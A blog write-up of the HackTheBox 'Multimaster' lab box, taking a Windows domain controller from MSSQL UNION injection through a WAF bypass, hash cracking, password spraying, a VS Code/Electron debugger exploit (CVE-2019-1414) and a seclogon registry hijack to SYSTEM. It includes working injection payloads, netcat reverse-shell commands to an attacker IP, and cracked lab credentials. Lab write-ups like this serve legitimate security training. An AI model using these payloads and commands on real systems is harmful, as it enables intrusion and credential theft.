---
layout: post
title: Multimaster
subtitle: Multimaster HackTheBox
cover-img: /assets/img/htb-bg.png
thumbnail-img: /assets/img/Multimaster_Big.png
share-img: /assets/img/Multimaster_Release.jpg
tags: [Active Directory, Windows, Pentesting, CVE, SQLi]
categories: HackTheBox
comments: true

---
<img src="https://github.com/susMdT/secondsite.github.io/blob/master/assets/img/Multimaster_Release.jpg?raw=true" class="mx-auto d-block" unselectable="on" />
Multimaster is an insane level box on HackTheBox that was pretty difficult. It used a variety of technologies and techniques in order to gain Domain Admin. There  wasn't a significant emphasis on the Active Directory aspect, but it was still very interesting and helped me refine some of my skills.

## Walkthrough

### Recon

An nmap scan, followed by a full port and script scan, reveals the following information:

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 403 - Forbidden: Access is denied.
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-18 02:37:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2022-04-17T02:28:51
|_Not valid after:  2022-10-17T02:28:51
|_ssl-date: 2022-04-18T02:39:26+00:00; +14m29s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.70%I=7%D=4/17%Time=625CCB76%P=i686-pc-windows-windows%r(
SF:DNSVersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07vers
SF:ion\x04bind\0\0\x10\0\x03");
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h59m29s, deviation: 3h30m01s, median: 14m28s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2022-04-17T19:39:27-07:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2022-04-17 19:39:30
|_  start_date: 2022-04-17 19:28:58
```

A pretty standard domain controller. The isn't anything too interesting, except for the website. It seems like a mostly static, custom site, with a non-functional login page, but then there is a Colleague Finder function that seems to be very odd.

<img src="https://github.com/susMdT/secondsite.github.io/blob/master/assets/img/multimaster_1.PNG?raw=true" class="mx-auto d-block" unselectable="on" />

After fuzzing around it for a bit, it seems there's a WAF intended against SQL injection, entering a blank entry causes all colleagues to appear, and that requests send hits to an API endpoint.

<img src="https://github.com/susMdT/secondsite.github.io/blob/master/assets/img/multimaster_2.PNG?raw=true" class="mx-auto d-block" unselectable="on" />

```
POST /api/getColleagues HTTP/1.1
Host: 10.10.10.179
Content-Length: 15
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://10.10.10.179
Referer: http://10.10.10.179/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"name":"bruh"}
```

After trying out some WAF bypass tecniques, I found that unicode encoding works. Using [Cyber Chef](https://gchq.github.io/CyberChef/), I was able to make a successful injection under the "name" POST value.

```
HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Fri, 22 Apr 2022 03:54:01 GMT
Connection: close
Content-Length: 1821

[{"id":1,"name":"Sarina Bauer","position":"Junior Developer","email":"sbauer@megacorp.htb","src":"sbauer.jpg"},{"id":2,"name":"Octavia Kent","position":"Senior Consultant","email":"okent@megacorp.htb","src":"okent.jpg"},
```

<img src="https://github.com/susMdT/secondsite.github.io/blob/master/assets/img/multimaster_3.PNG?raw=true" class="mx-auto d-block" unselectable="on" />

Something to note is that in our injections, we have visible output returned to us. We abuse this with UNION injection, a technique that is similar to combining multiple select statements. The results of the UNION statement must have the same amount of columns returned to us, and since there are 5 parameters returned normally (id, name, position, email, and src), it's safe to assume our UNION statement should have 5 columns or return values, too. Additionally, to kill two birds with one stone, I'll use a call to the "@@version" variable to see if the database is MSSQL. Using the following payload (unencoded),

```
something' UNION select 1,2,3,4,@@version;--
```

we get this output:

```
[{"id":1,"name":"2","position":"3","email":"4","src":"Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) \n\tAug 22 2017 17:04:49 \n\tCopyright (C) 2017 Microsoft Corporation\n\tStandard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)\n"}]
```

We can confirm we have MSSQL UNION injection. I proceeded to use the following unencoded payloads to enumerate the database:

```
something' UNION select 1,2,3,4,name from master.dbo.sysdatabases;--
something' UNION select 1,2,3,4,table_name from Hub_DB.INFORMATION_SCHEMA.TABLES;--
something' UNION select 1,2,3,4,COLUMN_NAME from Hub_DB.INFORMATION_SCHEMA.COLUMNS where table_name = 'Logins';--
```

I tried using "sqlmap" at first, but it appears this website will temporarily ip ban us if we hit it with too many requests, so I did this manually. The first payload returns to us all of the databases on the service; I learned that our database was named "Hub_DB". The second statement enumerated the tables of our database and returned to us the "Logins" table (ours was the "Colleagues" table). The last payload enumerated the columns of the "Logins" table, returning "id", "password", and "username". Since we're already in the "Hub_DB" database, we can just have our UNION statement directly pull from the columns of the "Logins" table with the following payload:

```
something' UNION select 1,1,id,password,username from Logins;--
```

This returns to us a lot of valuable information:

```
[{"id":1,"name":"1","position":"1","email":"9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739","src":"sbauer"},{"id":1,"name":"1","position":"2","email":"fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa","src":"okent"},{"id":1,"name":"1","position":"3","email":"68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813","src":"ckane"},{"id":1,"name":"1","position":"4","email":"68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813","src":"kpage"},{"id":1,"name":"1","position":"5","email":"9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739","src":"shayna"},{"id":1,"name":"1","position":"6","email":"9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739","src":"james"},{"id":1,"name":"1","position":"7","email":"9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739","src":"cyork"},{"id":1,"name":"1","position":"8","email":"fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa","src":"rmartin"},{"id":1,"name":"1","position":"9","email":"68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813","src":"zac"},{"id":1,"name":"1","position":"10","email":"9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739","src":"jorden"},{"id":1,"name":"1","position":"11","email":"fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa","src":"alyx"},{"id":1,"name":"1","position":"12","email":"68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813","src":"ilee"},{"id":1,"name":"1","position":"13","email":"fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa","src":"nbourne"},{"id":1,"name":"1","position":"14","email":"68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813","src":"zpowers"},{"id":1,"name":"1","position":"15","email":"9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739","src":"aldom"},{"id":1,"name":"1","position":"16","email":"cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc","src":"minatotw"},{"id":1,"name":"1","position":"17","email":"cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc","src":"egre55"}]
```

Time to crack some hashes! It was a bit tough to find the hash type, but it was some form of SHA-384. After trying that and failing, I checked [hashcat examples](hashcat.net/wiki/doku.php?id=example_hashes) and tried the "Keccak-384" format, mode 17900. This works, and the following hashes were cracked:

```
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
```

Time to spray them with "crackmapexec". We already have a userlist from our UNION injection, so we can just compile a userlist and password list and feed it into the tool

```
┌──(root💀kali)-[/home/kali/HackTheBox/multimaster]
└─# crackmapexec smb 10.10.10.179 -u users.txt -p pass.txt --continue
```

However, none of them work. There is a possibility that there are more users than just those from the UNION injection. Also, it turns out [you can enumerate AD users via MSSQL](https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html), so it looks like that must be the play here. MSSQL can actually pull the SID of a domain object while also matching a SID to a domain object, but these are in a certain hex format. By pulling a domain object SID and truncating it to obtain the domain SID, it is possible to convert a relative id (RID) and append it to the domain SID to perform a lookup and enumerate a domain object. Rather than brute forcing the users ourselves, the article also conveniently has a [script](https://github.com/Keramas/mssqli-duet/blob/master/python/mssqli-duet.py) for this. The script was really buggy, though; first, it couldn't parse the HTTP request correctly, so I had to hard-code the host in the code in line 296 (`url = 'http://10.10.10.179/api/getColleagues'`). Secondly, it wasn't returning the domain users (despite the api returning them when I checked wireshark).

<img src="https://github.com/susMdT/secondsite.github.io/blob/master/assets/img/multimaster_4.PNG?raw=true" class="mx-auto d-block" unselectable="on" />

I had to modify the code on line 379, where the username is declared. I simply made it print the username (`print(username)`), and now I got a list of users (and groups) on my hand by running the script like so:

```
┌──(root💀kali)-[/home/kali/HackTheBox/multimaster]
└─# python3 duet.py -i "something'" -rid 1100-1200 -p name -r request.txt -t 4 -e unicode

====================================OUTPUT====================================
[+] Enumerating Active Directory via SIDs...
MEGACORP\\DnsAdmins
MEGACORP\\DnsUpdateProxy
MEGACORP\\svc-nas
MEGACORP\\Privileged IT Accounts
MEGACORP\\tushikikatomo
MEGACORP\\andrew
MEGACORP\\lana
```

I specified the rid to start at 1100, because thats where domain users typically begin. We also had to specify a sleep time because of the ip banning. Lastly, there is a convenient option to unicode the paylods to bypass the WAF. Adding these users to the list, I rerun my spray from before, and we get a hit!

```
┌──(root💀kali)-[/home/kali/HackTheBox/multimaster]
└─# crackmapexec smb 10.10.10.179 -u users.txt -p pass.txt
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\svc-nas:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\svc-nas:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\svc-nas:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\tushikikatomo:finance1
```

As with all AD boxes, I immediately ran "bloodhound-python" to enumerate the domain, and I also managed to WinRM in.

```
┌──(root💀kali)-[/home/kali/HackTheBox/multimaster]
└─# evil-winrm -i 10.10.10.179 -u tushikikatomo -p finance1

Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\alcibiades\Documents>
```

```
┌──(root💀kali)-[/home/kali/HackTheBox/multimaster/temp]
└─# bloodhound-python -u 'tushikikatomo' -p 'finance1' -d megacorp.local -ns 10.10.10.179 -c all

INFO: Found AD domain: megacorp.local
INFO: Connecting to LDAP server: MULTIMASTER.MEGACORP.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: MULTIMASTER.MEGACORP.LOCAL
INFO: Found 27 users
INFO: Connecting to GC LDAP server: MULTIMASTER.MEGACORP.LOCAL
INFO: Found 56 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: MULTIMASTER.MEGACORP.LOCAL
INFO: Done in 00M 21S
```

Putting the data in "bloodhound", we see this:

<img src="https://github.com/susMdT/secondsite.github.io/blob/master/assets/img/multimaster_5.PNG?raw=true" class="mx-auto d-block" unselectable="on" />

Our user, tushikikatomo is able to remotely access the computer via WinRM. There is another user, sbauer, that has "GenericWrite" on jorden, meaning that they write some properties, such as "DONT_REQ_PREAUTH", onto jorden, making them ASREProastable. Lastly, jorden is a Server Operator, which is a group that can easily escalate privileges via SeRestore and SeBackup privileges. It seems our path is to make our way to sbauer so we can gain access to jorden, leading us to compromise the domain controller. Let's get started.

### Foothold

In my evil-winrm session, I try to enumerate some privilege escalation vectors with winpeas, but there seems to be some form of AV detecting it. After looking at the groups in the domain, I noticed there was a "developer" group, which stuck out to me since it isn't a default group. Additionally there is Microsoft VS Code running, which makes sense based on the group name. I looked for privilege escalation related to VS code, and found CVE-2019-1414. Basically, applications running under the Electron framework in VS code have their debugger port enabled locally by default and javascript can be injected into this port. More details can be found on [this article](https://iwantmore.pizza/posts/cve-2019-1414.html). Within my WinRM session, I enumerated the processes running via "ps" (its pretty neat too, since it sometimes works when I don't have permissions for tasklist).

```
*Evil-WinRM* PS C:\Users\alcibiades\Documents> ps                                                                     
                                                                                                                      
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    413      22    17332       7060               404   1 Code         
    657      47    32448      67628              1704   1 Code       
    318      32    40896      26752              2656   1 Code       
    404      54    95240      89440              3756   1 Code    
    403      53    94484      40424              4568   1 Code    
    214      15     6112       4188              5092   1 Code   
    278      51    57672      74616              5320   1 Code    
    277      51    57812      44980              5716   1 Code    
    276      51    57560      14608              6624   1 Code       
    404      55    96472     135636              6760   1 Code 
```

And then I checked listening TCP ports

```
*Evil-WinRM* PS C:\Users\alcibiades\Documents> netstat -anop TCP

Active Connections
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2428
  TCP    127.0.0.1:1434         0.0.0.0:0              LISTENING       3408
  TCP    127.0.0.1:2148         0.0.0.0:0              LISTENING       5320
  TCP    127.0.0.1:4517         0.0.0.0:0              LISTENING       5716
  TCP    127.0.0.1:10443        0.0.0.0:0              LISTENING       6624
```

It seems pretty likely that there is an Electron application running; notice how process 5716, "Code", is also listening locally on 4517/tcp. [This Github repo](https://github.com/taviso/cefdebug/releases) has a tool that automatically detects a port and is able to inject into it. I'll upload the tool and use a ping test to see if it works.

```
*Evil-WinRM* PS C:\Users\alcibiades\Documents> .\cefdebug.exe
cefdebug.exe : [2022/04/21 23:25:05:9854] U: There are 6 tcp sockets in state listen.
    + CategoryInfo          : NotSpecified: ([2022/04/21 23:...n state listen.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2022/04/21 23:25:26:0629] U: There were 4 servers that appear to be CEF debuggers.
[2022/04/21 23:25:26:0629] U: ws://127.0.0.1:37224/2d6f7524-0714-4916-8004-3ed04d79623b
[2022/04/21 23:25:26:0629] U: ws://127.0.0.1:30749/1cdb8fc2-f55d-41f1-b8e4-eaccbba3352c
[2022/04/21 23:25:26:0629] U: ws://127.0.0.1:11373/777cea14-c2ba-4d5c-9ebb-ac3fad43d407
[2022/04/21 23:25:26:0629] U: ws://127.0.0.1:49149/05e41fb2-fcd7-4a00-8e10-530e0dc3137b

*Evil-WinRM* PS C:\Users\alcibiades\Documents> ./cefdebug.exe --url ws://127.0.0.1:49149/05e41fb2-fcd7-4a00-8e10-530e0dc3137b --code "process.mainModule.require('child_process').exec('ping /n 2 10.10.16.2')"
cefdebug.exe : [2022/04/21 23:25:57:5773] U: >>> process.mainModule.require('child_process').exec('ping /n 2 10.10.16.2')
    + CategoryInfo          : NotSpecified: ([2022/04/21 23:... 2 10.10.16.2'):String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2022/04/21 23:25:57:5773] U: <<< ChildProcess

┌──(root💀kali)-[/home/kali]
└─# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
02:02:14.170085 IP bruh.htb > 10.10.16.2: ICMP echo request, id 1, seq 1, length 40
02:02:14.170110 IP 10.10.16.2 > bruh.htb: ICMP echo reply, id 1, seq 1, length 40
02:02:15.129116 IP bruh.htb > 10.10.16.2: ICMP echo request, id 1, seq 2, length 40
02:02:15.129130 IP 10.10.16.2 > bruh.htb: ICMP echo reply, id 1, seq 2, length 40

```

Sweet, it works, despite the errors being shown. I can't upload an msfvenom payload because of the antivirus, but it seems a netcat binary works.

```
*Evil-WinRM* PS C:\Users\alcibiades\Documents> upload nc64.exe
Info: Uploading nc64.exe to C:\Users\alcibiades\Documents\nc64.exe

Data: 60360 bytes of 60360 bytes copied
Info: Upload successful!
*Evil-WinRM* PS C:\Users\alcibiades\Documents> ls

    Directory: C:\Users\alcibiades\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/21/2022  11:04 PM         259584 cefdebug.exe
-a----        4/21/2022  11:28 PM          45272 nc64.exe
```

Now all I have to do it just spin up a listener and catch the shell. I also need to put the netcat binary in a globally accessible folder, so whoever is running VScode can actually access the binary.

```
*Evil-WinRM* PS C:\Users\alcibiades\Documents> ./cefdebug.exe
cefdebug.exe : [2022/04/21 23:32:44:9695] U: There are 5 tcp sockets in state listen.
    + CategoryInfo          : NotSpecified: ([2022/04/21 23:...n state listen.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2022/04/21 23:33:05:0479] U: There were 3 servers that appear to be CEF debuggers.
[2022/04/21 23:33:05:0479] U: ws://127.0.0.1:16979/9ca0f5a9-61d3-40c8-adb5-6ed0886a8186
[2022/04/21 23:33:05:0479] U: ws://127.0.0.1:1568/51b11c8d-8d85-41ce-b3e2-f5ddcece7562
[2022/04/21 23:33:05:0479] U: ws://127.0.0.1:54266/856b444e-b749-449f-8e5f-bf294652d70b
*Evil-WinRM* PS C:\Users\alcibiades\Documents> mkdir \bruh

    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/21/2022  11:33 PM                bruh

*Evil-WinRM* PS C:\Users\alcibiades\Documents> copy nc64.exe \bruh\
*Evil-WinRM* PS C:\Users\alcibiades\Documents> ./cefdebug.exe --url ws://127.0.0.1:16979/9ca0f5a9-61d3-40c8-adb5-6ed0886a8186 --code "process.mainModule.require('child_process').exec('\\bruh\\nc64.exe -e cmd 10.10.16.2 445')"
cefdebug.exe : [2022/04/21 23:33:39:0457] U: >>> process.mainModule.require('child_process').exec('\\bruh\\nc64.exe -e cmd 10.10.16.2 445')
    + CategoryInfo          : NotSpecified: ([2022/04/21 23:...0.10.16.2 445'):String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2022/04/21 23:33:39:0457] U: <<< ChildProcess

┌──(root💀kali)-[/home/kali]
└─# rlwrap nc -nvlp 445                                                                                                                   
Ncat: Listening on 0.0.0.0:445
Ncat: Connection from 10.10.10.179.
Ncat: Connection from 10.10.10.179:51578.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Program Files\Microsoft VS Code>whoami
megacorp\cyork
```

it seems we've reached another user, but not quite the one we want (sbauer). This one also appears to be in the "Developers" group. Like last time, there's no winpeas, but after manually enumerating some files and ACLs, I did notice that this user has access to the webroot directory. Remember how MSSQL is running? Theoretically, there should be some sort of file here that makes the connection to the database, and that file should have the creds to the database which we can spray. Although there are no .aspx files, I found it odd that there was a "bin" folder.

```
Directory of C:\inetpub\wwwroot

01/07/2020  10:28 PM    <DIR>          .
01/07/2020  10:28 PM    <DIR>          ..
01/07/2020  10:28 PM    <DIR>          aspnet_client
01/07/2020  10:28 PM    <DIR>          assets
01/07/2020  10:28 PM    <DIR>          bin
01/07/2020  10:28 PM    <DIR>          Content
01/07/2020  11:50 PM    <DIR>          css
01/06/2020  05:49 PM             3,614 favicon.ico
01/07/2020  10:28 PM    <DIR>          fonts
01/06/2020  11:36 PM                98 Global.asax
01/07/2020  10:28 PM    <DIR>          images
01/07/2020  10:28 PM    <DIR>          img
01/07/2020  11:52 PM             1,098 index.html
01/07/2020  11:50 PM    <DIR>          js
01/07/2020  10:28 PM    <DIR>          Scripts
01/07/2020  10:28 PM    <DIR>          Views
01/09/2020  05:13 AM             3,640 Web.config
               4 File(s)          8,450 bytes
              13 Dir(s)   6,584,827,904 bytes free

C:\inetpub\wwwroot>
```

Most of the files, based on their modification date, seem to be default. But there are two that stick out to me due to their name and modification date; the MultimasterAPI files. I'll copy them over to my Kali machine by hosting an smb server with "impacket" and I'll try to decompile them.

```
┌──(root💀kali)-[/home/kali/HackTheBox/multimaster]                                                                   
└─# impacket-smbserver share . -smb2support                                                                           
```

I ran "strings" multiple times with different encodings, and found that 16 bit encoding nets something useful

```
┌──(root💀kali)-[/home/kali/HackTheBox/multimaster]
└─# strings -eb apidll

...
erver=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;
```

It seems this is how the webpage was able to communicate and make SQL queries. Spraying this password in a similar fashion as before gives us a hit to sbauer, and we can now utilize WinRM for a shell.

### Privilege Escalation

Time to continue our kill chain. I could use my GenericWrite as sbauer over jorden to make him ASREProastable and crack the hash if jorden has a weak password.

```
*Evil-WinRM* PS C:\Users\sbauer\Documents> get-aduser 'jorden' | set-adaccountcontrol -doesnotrequirepreauth 1

┌──(root💀kali)-[/home/kali/HackTheBox/multimaster]
└─# impacket-GetNPUsers megacorp.local/'sbauer':'D3veL0pM3nT!' -dc-ip 10.10.10.179 -request
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Name    MemberOf                                      PasswordLastSet             LastLogon  UAC      
------  --------------------------------------------  --------------------------  ---------  --------
jorden  CN=Developers,OU=Groups,DC=MEGACORP,DC=LOCAL  2020-01-09 19:48:17.503303  <never>    0x410200 


$krb5asrep$23$jorden@MEGACORP.LOCAL:386bc264be355689e24f3b3ef2f65358$4a360543309d1dac3a6d38f997e40faf4320af7d06fa5694592c366b9199894ff538152703fe1990901fab235ea8a579d8ec86b7cefe89e47b21917f06050c2679339203a14e64003dffdc8714ae823b9754002445b4cdef75134ed5af6697d19ee95d00301a5c48f49c1cb91830351e57fcb2c42b6251083326e0c134032e2290bee5b4346f56db469f50ea3bbf041b515ebe9b7d99124298d20ae13f7551c4928a6501e7d8f3ed189afdf7ea084dbdf6cf743253d3817842effa8722f68e542b4c3cc7f0f150bcfa0a5f17200f9e6f6f89c0190fdd88d3555856a8a5097368482af9222054fb6739dc3a56acb3307f
```

And the hash manages to crack to: 

```
$krb5asrep$23$jorden@MEGACORP.LOCAL:386bc264be355689e24f3b3ef2f65358$4a360543309d1dac3a6d38f997e40faf4320af7d06fa5694592c366b9199894
ff538152703fe1990901fab235ea8a579d8ec86b7cefe89e47b21917f06050c2679339203a14e64003dffdc8714ae823b9754002445b4cdef75134ed5af6697d19ee
95d00301a5c48f49c1cb91830351e57fcb2c42b6251083326e0c134032e2290bee5b4346f56db469f50ea3bbf041b515ebe9b7d99124298d20ae13f7551c4928a650
1e7d8f3ed189afdf7ea084dbdf6cf743253d3817842effa8722f68e542b4c3cc7f0f150bcfa0a5f17200f9e6f6f89c0190fdd88d3555856a8a5097368482af922205
4fb6739dc3a56acb3307f:rainforest786
```

And we can evil-winrm our way in. Remember that jorden is in the Server Operators group, so we have the following privileges.

```
*Evil-WinRM* PS C:\Users\jorden\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled

```

There are many ways to go about this. My personal choice is leverage the SeRestore privilege only; users with this privilege have write access to any file and registry keys on the system. All users can start the seclogon service, so we can overwrite the registry key specifying its image path, and then start it for a shell. Since this will prompt us to confirm if we want to overwrite its current image path, we need a normal reverse shell. I'll call netcat to gain a reverse shell, overwrite the key, then start the service and listen to catch a SYSTEM shell.

```
*Evil-WinRM* PS C:\Users\jorden\Documents> \bruh\nc64.exe -e cmd.exe 10.10.16.2 4444

C:\Users\jorden\Documents> reg add hklm\system\currentcontrolset\services\seclogon /v imagepath /t reg_sz /d "\bruh\nc64.exe -e cmd.exe 10.10.16.2 4444"

Value imagepath exists, overwrite(Yes/No)? y
The operation completed successfully.

C:\Users\jorden\Documents>sc start seclogon

┌──(root💀kali)-[/home/kali]
└─# rlwrap nc -nvlp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.179.
Ncat: Connection from 10.10.10.179:51921.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
nt authority\system

```

Our shell dies after a while because the service thinks its failing to start, but we basically have a shell. 

### Afterthoughts

This was a pretty cool box since there was a lot of interesting attack vectors. The Electron CVE and reading into the binaries of the IIS server caught my eye in particular. Also, its always fun getting to practice some tough UNION injection. Like Sizzle, this box was also vulnerable to ZeroLogon which was tempting to abuse. This box isn't doesn't have as much Active Directory as I would have expected, but I think its still a solid box.

-Dylan Tran 4/22/2022



